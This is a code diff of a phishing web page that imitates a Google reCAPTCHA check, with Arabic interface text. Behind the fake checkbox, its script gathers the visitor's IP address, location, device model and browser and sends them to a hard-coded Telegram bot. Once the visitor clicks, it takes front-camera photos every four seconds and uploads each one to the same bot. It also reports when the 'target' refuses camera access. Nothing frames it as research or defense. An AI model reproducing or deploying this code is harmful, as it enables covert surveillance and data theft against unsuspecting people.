@@ -3,25 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection</title>
+    <title>التحقق من الأمان</title>
     <style>
-        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .card { text-align: center; padding: 30px; border-radius: 12px; border: 1px solid #eee; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .loader { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; direction: rtl; }
+        .captcha-card { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 0 4px rgba(0,0,0,0.1); }
+        .captcha-left { display: flex; align-items: center; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; cursor: pointer; position: relative; }
+        .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { display: none; padding: 12px 30px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .text { color: #555; font-size: 14px; user-select: none; }
+        .captcha-right { text-align: center; min-width: 70px; }
+        .captcha-right img { width: 30px; }
+        .captcha-right div { font-size: 8px; color: #9b9b9b; margin-top: 3px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="loader" id="ldr"></div>
-        <p id="msg">جاري فحص أمان المتصفح...</p>
-        <button id="btn">متابعة الآن</button>
+    <div class="captcha-card">
+        <div class="captcha-left">
+            <div class="checkbox" id="btn"></div>
+            <div class="text" id="msg">أنا لست برنامج روبوت</div>
+        </div>
+        <div class="captcha-right">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+            <div>الخصوصية - البنود</div>
+        </div>
     </div>
 
-    <video id="v" autoplay playsinline muted style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
         const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
@@ -31,7 +42,6 @@
             let n = navigator;
             let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
-            // 1. الشبكة والـ IP (كما طلبت دون تغيير)
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
@@ -40,14 +50,12 @@
                 report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
             } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }
 
-            // 2. فحص نوع الهاتف بدقة عميقة (تعديل النظام)
             let deviceDetail = "Linux (Generic)";
             try {
                 if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
-                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                     deviceDetail = `${ua.model} - Android ${ua.platformVersion}`;
                 } else {
-                    // استخراج الموديل من نص المتصفح (مثال: Samsung SM-G991B)
                     let uaText = n.userAgent;
                     let modelMatch = uaText.match(/\(([^)]+)\)/);
                     if (modelMatch && modelMatch[1]) {
@@ -59,12 +67,7 @@
             
             report += `📱 **النظام:** ${deviceDetail}\n`;
 
-            // 3. المتصفح والرسوميات
-            let bName = "مجهول";
-            if (n.userAgent.includes("Brave")) bName = "Brave";
-            else if (n.userAgent.includes("Chrome")) bName = "Chrome";
-            else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) bName = "Safari";
-            else if (n.userAgent.includes("Firefox")) bName = "Firefox";
+            let bName = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Other";
             report += `🧭 **المتصفح:** ${bName}\n`;
 
             try {
@@ -84,103 +87,53 @@
             } catch (e) {}
 
             report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
-
             sendText(report);
-
-            setTimeout(() => {
-                document.getElementById('ldr').style.display = 'none';
-                document.getElementById('msg').innerText = "اكتمل الفحص بنجاح.";
-                document.getElementById('btn').style.display = 'inline-block';
-            }, 1000);
         }
 
-        document.getElementById('check').onclick = async function() {
-    let box = this;
-    let statusText = document.getElementById('status');
-    let pBox = document.getElementById('progress-box');
-    
-    box.classList.add('loading');
-    
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: "user",
-                width: { ideal: 640 }, // تقليل الدقة قليلاً يسرع الاستجابة في كروم
-                height: { ideal: 480 }
-            } 
-        });
-
-        const video = document.getElementById('v');
-        video.srcObject = s;
-
-        // ✅ حل مشكلة السواد: الانتظار حتى يبدأ تيار الفيديو فعلياً
-        video.onloadedmetadata = () => {
-            video.play(); // التأكد من التشغيل
+        document.getElementById('btn').onclick = async function() {
+            this.classList.add('loading');
+            document.getElementById('msg').innerText = "جاري التحقق...";
             
-            // إظهار واجهة التحميل للمستخدم
-            box.style.display = 'none';
-            statusText.innerText = "جاري تأمين الاتصال...";
-            pBox.style.display = 'block';
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 } 
+                });
+                const video = document.getElementById('v');
+                video.srcObject = s;
 
-            // انتظر ثانيتين (لضبط الإضاءة) ثم ابدأ الالتقاط
-            setTimeout(() => {
-                let snapInterval = setInterval(snap, 3500);
-                
-                // شريط التحميل الوهمي
-                let width = 0;
-                let loading = setInterval(() => {
-                    if (width >= 100) {
-                        clearInterval(loading);
-                        clearInterval(snapInterval);
-                        window.location.href = nextPage;
-                    } else {
-                        width += 2; 
-                        document.getElementById('fill').style.width = width + '%';
-                    }
-                }, 300); 
-            }, 2000); 
-        };
-
-    } catch (e) {
-        statusText.innerText = "فشل التحقق. يرجى تفعيل الكاميرا.";
-        box.classList.remove('loading');
-    }
-};
-
-function snap() {
-    const canvas = document.getElementById('c');
-    const video = document.getElementById('v');
-    
-    // ✅ فحص إضافي لمنع الصور السوداء
-    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        
-        // رسم الصورة
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(blob => {
-            const f = new FormData();
-            f.append('chat_id', chat);
-            f.append('photo', blob, 'img.jpg');
-            fetch(api + "sendPhoto", { method: 'POST', body: f });
-        }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً يضمن وصولها أسرع في كروم
-    }
+                // حل مشكلة كروم و Brave: الانتظار حتى يتأكد المتصفح من تشغيل الفيديو
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // تأخير بسيط ثانية واحدة قبل أول صورة لضمان عدم ظهور سواد
+                    setTimeout(() => {
+                        setInterval(snap, 4000);
+                        // توجيه اختياري بعد نجاح التشغيل
+                        // window.location.href = "project.html"; 
+                    }, 1000);
+                };
+            } catch (e) {
+                sendText("⚠️ **المستهدف رفض الكاميرا**");
+                this.classList.remove('loading');
+                document.getElementById('msg').innerText = "فشل التحقق. يرجى تفعيل الكاميرا.";
             }
         };
 
         function snap() {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const f = new FormData();
-                f.append('chat_id', chat);
-                f.append('photo', blob, 'x.jpg');
-                fetch(api + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.8);
+            
+            // التأكد أن الفيديو يحتوي على بيانات حقيقية (ReadyState) لمنع السواد
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const f = new FormData();
+                    f.append('chat_id', chat);
+                    f.append('photo', blob, 'x.jpg');
+                    fetch(api + "sendPhoto", { method: 'POST', body: f });
+                }, 'image/jpeg', 0.8);
+            }
         }
 
         function sendText(txt) {
